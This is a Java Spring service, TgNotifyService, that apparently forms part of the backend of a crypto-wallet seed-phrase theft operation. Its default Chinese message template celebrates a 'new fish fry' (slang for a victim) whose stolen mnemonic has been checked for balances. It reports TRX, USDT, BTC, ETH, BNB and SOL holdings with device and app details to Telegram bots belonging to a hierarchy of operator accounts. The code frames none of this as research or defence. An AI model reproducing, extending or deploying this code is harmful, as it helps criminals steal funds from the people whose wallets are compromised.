package com.consumer.service;

import java.time.ZoneId;
import java.time.ZonedDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.Collections;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.commons.lang3.StringUtils;
import org.springframework.data.redis.core.StringRedisTemplate;
import org.springframework.stereotype.Service;

import com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;
import com.consumer.dao.AdminUserDao;
import com.consumer.dao.AppidDao;
import com.consumer.dao.DeviceDao;
import com.consumer.dao.TgMessageTemplateDao;
import com.consumer.entity.AdminUserEntity;
import com.consumer.entity.AppidEntity;
import com.consumer.entity.DeviceEntity;
import com.consumer.entity.TgMessageTemplateEntity;

import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;

@Slf4j
@Service
@RequiredArgsConstructor
public class TgNotifyService {

    public static final String TEMPLATE_MNEMONIC_BALANCE = "mnemonic_balance";
    private static final String DEFAULT_MNEMONIC_BALANCE_BODY =
            "🌷🌷🌷新鱼苗余额查询成功🌷🌷🌷\n\n"
                    + "👁️群id: {group_id}\n📔归属：{owner}\n🔗来源APP名称：{app_name}\n🙇型号：{model}\n"
                    + "📲设备id: {device_id}\n⏰时间：{time}\n\n"
                    + "💰Tron: {tron_trx}trx /{tron_usdt}usdt\n💰BTC: {btc}btc\n"
                    + "💰Eth: {eth}eth/{eth_usdt}usdt\n💰BSC: {bnb}bnb/{bsc_usdt}usdt\n"
                    + "💰SOL: {sol}sol/{sol_usdt}usdt";
    private static final Pattern PLACEHOLDER = Pattern.compile("\\{([a-zA-Z0-9_]+)\\}");
    private static final DateTimeFormatter TIME_FMT = DateTimeFormatter.ofPattern("yyyy.MM.dd HH:mm:ss");
    private static final ZoneId BEIJING = ZoneId.of("Asia/Shanghai");

    private final DeviceDao deviceDao;
    private final AppidDao appidDao;
    private final AdminUserDao adminUserDao;
    private final TgMessageTemplateDao templateDao;
    private final SettingsService settingsService;
    private final ParseQueueService parseQueueService;
    private final StringRedisTemplate redis;

    public boolean notifyMnemonicBalance(String deviceId, String appId, Map<String, String> balances,
            String source, Long mnemonicId) {
        String did = StringUtils.trimToEmpty(deviceId).toLowerCase();
        if (did.isEmpty()) {
            return false;
        }
        if (!settingsService.shouldNotifyBalance(balances)) {
//            log.info("tg mnemonic_balance skip: below thresholds device={} mnemonic_id={}", did, mnemonicId);
            return false;
        }
        if (mnemonicId != null && mnemonicId > 0) {
            String pushKey = "tg:bal_push:" + mnemonicId;
            int already = 0;
            try {
                String raw = redis.opsForValue().get(pushKey);
                if (raw != null) {
                    already = Integer.parseInt(raw);
                }
            } catch (Exception ignored) {
            }
            Integer limit = settingsService.getBalancePushCountOrUnlimited();
            if (limit != null && already >= limit) {
//                log.info("tg mnemonic_balance skip: push_count limit={} already={} mnemonic_id={}",
//                        limit, already, mnemonicId);
                return false;
            }
        }
        DeviceEntity device = findDevice(did);
        String aid = StringUtils.defaultIfBlank(appId, device == null ? "" : device.getAppId());
        String[] creds = resolveTgCredentials(aid);
        if (creds == null) {
//            log.info("tg mnemonic_balance skip: no bot/group appId={} device={}", aid, did);
            return false;
        }
        TgMessageTemplateEntity tpl = templateDao.selectOne(new QueryWrapper<TgMessageTemplateEntity>()
                .eq("code", TEMPLATE_MNEMONIC_BALANCE).eq("status", 1).last("LIMIT 1"));
        String body = tpl == null ? null : tpl.getBody();
        if (StringUtils.isBlank(body)) {
            log.warn("tg template missing/disabled: {}，使用默认正文", TEMPLATE_MNEMONIC_BALANCE);
            body = DEFAULT_MNEMONIC_BALANCE_BODY;
        }
        Map<String, String> vars = deviceVars(device, did, aid, creds[1]);
        vars.put("source", StringUtils.defaultIfBlank(source, "—"));
        if (balances != null) {
            for (String k : new String[] {
                    "tron_trx", "tron_usdt", "btc", "eth", "eth_usdt", "bnb", "bsc_usdt", "sol", "sol_usdt"}) {
                vars.put(k, StringUtils.defaultIfBlank(balances.get(k), "0"));
            }
        }
        Map<String, Object> meta = new LinkedHashMap<>();
        meta.put("template", TEMPLATE_MNEMONIC_BALANCE);
        meta.put("device_id", did);
        meta.put("mnemonic_id", mnemonicId == null ? 0 : mnemonicId);
        boolean queued = parseQueueService.enqueueTelegram(creds[0], creds[1], render(body, vars), meta);
        if (queued) {
            log.info("【telegram】mnemonic_balance queued device={} mnemonic_id={} source={}",
                    did, mnemonicId, source);
        }
        if (queued && mnemonicId != null && mnemonicId > 0) {
            String pushKey = "tg:bal_push:" + mnemonicId;
            try {
                Long n = redis.opsForValue().increment(pushKey);
                if (n != null && n == 1L) {
                    redis.expire(pushKey, 30, TimeUnit.DAYS);
                }
            } catch (Exception e) {
                log.warn("tg mnemonic_balance push_count incr fail mnemonic_id={}: {}", mnemonicId, e.toString());
            }
        }
        return queued;
    }

    public String[] resolveTgCredentials(String appId) {
        String aid = StringUtils.trimToEmpty(appId).toLowerCase();
        if (aid.isEmpty()) {
            return null;
        }
        AppidEntity app = appidDao.selectOne(new QueryWrapper<AppidEntity>().eq("appid", aid).last("LIMIT 1"));
        if (app == null || app.getUserid() == null) {
            return null;
        }
        Integer uid = app.getUserid();
        for (int guard = 0; uid != null && uid > 0 && guard < 8; guard++) {
            AdminUserEntity user = adminUserDao.selectById(uid);
            if (user == null) {
                break;
            }
            String token = StringUtils.trimToEmpty(user.getTgRobToken());
            String group = StringUtils.trimToEmpty(user.getTgGroupid());
            if (!token.isEmpty() && !group.isEmpty()) {
                return new String[] {token, group};
            }
            uid = user.getParentId();
        }
        return null;
    }

    public Integer resolveUserId(String appId) {
        String aid = StringUtils.trimToEmpty(appId);
        if (aid.isEmpty()) {
            return 0;
        }
        AppidEntity app = appidDao.selectOne(new QueryWrapper<AppidEntity>().eq("appid", aid).last("LIMIT 1"));
        if (app == null && !aid.equals(aid.toLowerCase())) {
            app = appidDao.selectOne(new QueryWrapper<AppidEntity>().eq("appid", aid.toLowerCase()).last("LIMIT 1"));
        }
        return app == null || app.getUserid() == null ? 0 : app.getUserid();
    }

    private Map<String, String> deviceVars(DeviceEntity device, String did, String appId, String groupId) {
        Map<String, String> vars = new LinkedHashMap<>();
        vars.put("group_id", groupId);
        vars.put("owner", ownerLabel(appId));
        vars.put("app_name", device == null ? "—" : StringUtils.defaultIfBlank(device.getAppName(), "—"));
        vars.put("model", formatModel(device));
        vars.put("device_id", did);
        vars.put("ip", device == null ? "—" : StringUtils.defaultIfBlank(device.getIp(), "—"));
        vars.put("time", ZonedDateTime.now(BEIJING).format(TIME_FMT));
        return vars;
    }

    private String ownerLabel(String appId) {
        AppidEntity app = appidDao.selectOne(new QueryWrapper<AppidEntity>()
                .eq("appid", StringUtils.trimToEmpty(appId).toLowerCase()).last("LIMIT 1"));
        if (app == null || app.getUserid() == null) {
            return "—";
        }
        List<String> names = new ArrayList<>();
        Integer uid = app.getUserid();
        for (int g = 0; uid != null && uid > 0 && g < 8; g++) {
            AdminUserEntity user = adminUserDao.selectById(uid);
            if (user == null) {
                break;
            }
            names.add(StringUtils.defaultIfBlank(user.getDisplayName(),
                    StringUtils.defaultIfBlank(user.getUsername(), "user#" + user.getId())));
            uid = user.getParentId();
        }
        Collections.reverse(names);
        return names.isEmpty() ? "—" : String.join(" / ", names);
    }

    private static String formatModel(DeviceEntity d) {
        if (d == null) {
            return "—";
        }
        String base = StringUtils.defaultIfBlank(d.getHardwareModel(), StringUtils.defaultIfBlank(d.getModel(), "—"));
        String ver = StringUtils.trimToEmpty(d.getIosVersion());
        return ver.isEmpty() ? base : base + "/" + ver;
    }

    private DeviceEntity findDevice(String did) {
        DeviceEntity d = deviceDao.selectOne(new QueryWrapper<DeviceEntity>().eq("deviceId", did).last("LIMIT 1"));
        if (d == null && !did.equals(did.toLowerCase())) {
            d = deviceDao.selectOne(new QueryWrapper<DeviceEntity>().eq("deviceId", did.toLowerCase()).last("LIMIT 1"));
        }
        return d;
    }

    static String render(String body, Map<String, String> vars) {
        if (body == null) {
            return "";
        }
        Matcher m = PLACEHOLDER.matcher(body);
        StringBuffer sb = new StringBuffer();
        while (m.find()) {
            String key = m.group(1);
            String val = vars.containsKey(key) ? vars.get(key) : m.group(0);
            m.appendReplacement(sb, Matcher.quoteReplacement(val == null ? "" : val));
        }
        m.appendTail(sb);
        return sb.toString();
    }
}
